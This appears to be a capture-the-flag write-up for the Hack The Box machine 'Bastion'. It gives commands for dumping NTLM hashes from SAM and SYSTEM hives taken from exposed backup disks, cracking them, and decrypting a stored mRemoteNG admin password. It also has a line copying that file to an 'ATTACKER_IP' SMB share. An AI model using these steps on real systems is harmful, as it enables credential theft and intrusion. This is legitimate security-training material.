## Welcome everyone!

Today, we will explore “Bastion”, a machine from **Hack The Box**.

![image](/HTB/Bastion/Bastion_images/1.png)

## Information Gathering

First, we will perform an aggressive scan with **Nmap** to gather as much information as possible about the system we’re targeting:

![image](/HTB/Bastion/Bastion_images/2.png)

There are multiple services running:

**SSH** (Port 22)

**RPC** (Port 135)

**NetBIOS** (Port 139)

**SMB** (Port 445)

**WinRM** (Port 5985)

Since we start the box without credentials, let’s attempt to use `smbclient` to list SMB shares anonymously with the `-L` switch, paired with the `-N` switch:

![image](/HTB/Bastion/Bastion_images/3.png)

It worked. Listing the available shares reveals an uncommon `Backups` share, which is the only non-default share. Let’s attempt to access it anonymously:

![image](/HTB/Bastion/Bastion_images/4.png)

We successfully accessed the share, which appears to be publicly accessible. An interesting `note.txt` file is hosted there. Opening it displays the following line:

“*Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.*”

Nothing that we could use to gain access there.

Accessing the `WindowsImageBackup` folder reveals another `L4mpje-PC` folder, which strongly suggests that a `L4mpje` user exists on the target system.

A deeper enumeration of the share leads us to the `\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\` folder, which contains two interesting `.vhd` files.

![image](/HTB/Bastion/Bastion_images/5.png)

These files are **virtual hard disk (VHD) images** containing NTFS filesystems from the Windows backup. They could contain sensitive files, including Windows registry hives. Researching VHD analysis techniques led me to `guessmount`, a tool from the **libguestfs** suit used for credential harvesting.

![image](/HTB/Bastion/Bastion_images/6.png)

Let’s download both `.vhd` files from the SMB share to our local machine using the `get` command. This could take a while, especially for the second one.

Once both files are in our directory, after creating a `vhd_mount` folder, we can execute the following command to mount the NTFS filesystem and access the files stored inside the VHD:

`sudo guestmount --add 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --mount /dev/sda1 --ro vhd_mount`

The `--ro` option mounts the filesystem in read-only mode, allowing us to analyze the disk without modifying the original VHD. This is enough for us because all we need is to access sensitive files located in the protected `C:\Windows\System32\` directory. Since we are working with disk images, we can access these files locally without being restricted by the permissions of our normal Windows user.

![image](/HTB/Bastion/Bastion_images/6.png)

The first VHD contains a small NTFS partition with boot-related files, such as `bootmgr` and `BOOTSECT.BAK`.

Now, let’s mount the second one:

(Ensure that you unmount the first disk before mounting the second one by using `guestunmount vhd_mount`. It is also recommended to execute these commands with `sudo` to avoid permission issues.)

![image](/HTB/Bastion/Bastion_images/7.png)

The target filesystem has successfully been mounted on our local machine! This is very interesting from a security perspective. We can now access the files we want from the Windows filesystem. Since we mounted the filesystem in read-only mode, we can safely inspect and copy sensitive files without modifying the original VHD.

Accessing the `C:\Windows\System32\config\` directory allows us to retrieve the `SAM` and `SYSTEM` registry hive files. These files can be used to extract the NTLM password hashes of local Windows users.

So let’s run the following command to verify if this can be achieved:

`sudo ls -la vhd_mount/Windows/System32/config/`

![image](/HTB/Bastion/Bastion_images/8.png)

The registry hives have successfully been identified. We can use `cp` to copy them to our current folder:

![image](/HTB/Bastion/Bastion_images/9.png)

Both files have successfully been extracted. But how do we extract password hashes from the Windows registry? There is a tool called `impacket-secretsdump` from the awesome **Impacket** suite, allowing us to achieve this through the following command:

`sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL`

(Because the files come from a disk mounted as **root**, you need to execute the command with `sudo`.)

![image](/HTB/Bastion/Bastion_images/10.png)

We successfully extracted the local users' password hashes from the Windows registry through the `SAM` and `SYSTEM` registry hives, which were retrieved from the publicly exposed virtual hard disks.

If users had weak passwords, an attacker could potentially crack their hashes and authenticate as those users, potentially leading to a full compromise of the system. However, that is not the case here. Attempting to crack the **Administrator** NT hash reveals that the account has a blank password. However, we also identified the NTLM hash associated with the **L4mpje** user's password, so let’s attempt to crack it offline using **Hashcat** with `-m 1000` to specify that we're dealing with a NT hash:

(Paste only the **NT** hash into a `hash.txt` file.)

![image](/HTB/Bastion/Bastion_images/11.png)

![image](/HTB/Bastion/Bastion_images/12.png)

We successfully cracked the L4mpje password, allowing us to retrieve it in cleartext: `bureaulampje`. This could allow us to obtain our initial foothold on the target system!

We previously discovered from our Nmap scan that SSH was running. Indeed, authenticating with the credentials we found allows us to gain initial access to the target system:

![image](/HTB/Bastion/Bastion_images/13.png)

The first flag can be retrieved in the `C:\Users\L4mpje\Desktop\` directory:

![image](/HTB/Bastion/Bastion_images/14.png)

## Privilege Escalation

Inspecting system programs in the `C:\Program Files (x86)\` directory, an uncommon piece of software appears to be installed: `mRemoteNG`.

![image](/HTB/Bastion/Bastion_images/15.png)

Inspecting the software configuration folder associated with our current user through `%appdata%`, we can observe multiple configuration files that appear to be associated with the software. Inspecting the `confCons.xml` file reveals information that should not be accessible to every user:

![image](/HTB/Bastion/Bastion_images/16.png)

I highlighted the line of interest for us: the Administrator’s encrypted password is stored directly in the configuration file. If we find a way to decrypt this password, we could potentially compromise the Administrator account regardless of how strong the original password is.

Researching password decryption techniques led me to a Python script hosted on this [GitHub repository](https://github.com/gquere/mRemoteNG_password_decrypt), displayed below:

![image](/HTB/Bastion/Bastion_images/17.png)

Let’s execute it with the `-h` switch to display the manual page:

![image](/HTB/Bastion/Bastion_images/18.png)

It appears that the script can parse a configuration file, which means that we need to download the file from the target to our local machine in order to decrypt the stored passwords locally.

This can be achieved by starting an **SMB server** on our local machine using the `impacket-smbserver` tool for file transfer. The following command can be used:

`impacket-smbserver -smb2support share <LOCAL_FOLDER>`

Afterwards, we will use the following command to transfer the file from the target to our local machine:

`copy confCons.xml \\ATTACKER_IP\share`

![image](/HTB/Bastion/Bastion_images/19.png)

The file appears to have been successfully copied. Let’s verify it:

![image](/HTB/Bastion/Bastion_images/20.png)

Indeed, that is the case. Let’s move the `confCons.xml` file into the mRemoteNG password-decrypter folder in order to decrypt its stored passwords. Now that the file is in our hands, let’s provide the configuration file to our Python script:

![image](/HTB/Bastion/Bastion_images/21.png)

We successfully decrypted the stored password!

This allows us to retrieve the `thXLHM96BeKL0ER2` password from ciphertext to plaintext.

Since we previously determined that WinRM was enabled, we can use the recovered Administrator credentials with the `evil-winrm` tool to authenticate to the target:

![image](/HTB/Bastion/Bastion_images/22.png)

The password is correct! Let’s verify that we successfully escalated our privileges vertically:

![image](/HTB/Bastion/Bastion_images/23.png)

Indeed, we did! This results in a total compromise of the target system, with full access and control over it. The final flag can be retrieved in the `C:\Users\Administrator\Desktop\` directory:

![image](/HTB/Bastion/Bastion_images/24.png)

Challenge completed!

![image](/HTB/Bastion/Bastion_images/25.png)

## Conclusion

This challenge was interesting to complete. It all started with two **virtual hard disks** (VHDs) that we discovered on a publicly accessible SMB share. These disk images allowed us to mount the target NTFS filesystem on our local machine, enabling us to inspect its files without being restricted by the permissions of our Windows user.

From there, we extracted the `SAM` and `SYSTEM` protected **registry hives** and used `impacket-secretsdump` to dump the local users' NTLM hashes. This allowed us to obtain an initial foothold on the target system as the **L4mpje** user.

Enumerating the local system led us to discover **mRemoteNG**. Moreover, an encrypted Administrator password was stored in its `confCons.xml` configuration file. We leveraged our initial access to transfer this authentication-related file to our local machine and decrypt the stored **Administrator** password.

Since WinRM was enabled, we then used the recovered credentials with **Evil-WinRM** to authenticate as Administrator, resulting in a complete compromise of the target system.

## Thank you for reading!
